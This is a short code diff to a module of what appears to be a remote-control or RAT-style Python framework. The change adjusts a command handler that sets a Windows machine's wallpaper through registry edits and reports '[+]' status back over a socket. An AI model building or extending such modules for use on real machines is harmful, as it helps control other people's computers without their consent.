@@ -1,10 +1,9 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.config as config
+
 config.main()
 interface = config.interface
-if interface == "GUI":
-    from flask import jsonify
 
 
 def main(option):
@@ -20,7 +19,7 @@ def wallpaper(data):
     RegSetValueEx(key, "WallpaperStyle", 0, REG_SZ, "0")
     RegSetValueEx(key, "CenterWallpaper", 0, REG_SZ, "0")
     SystemParametersInfo(SPI_SETDESKWALLPAPER, path, 1+2)
-    main_send('[+]Set wallpaper to : ' + path, s)
+    send_all(s,'[+]Set wallpaper to : ' + path)
 ''')
         config.logics.append('''
             elif command == "wallpaper":
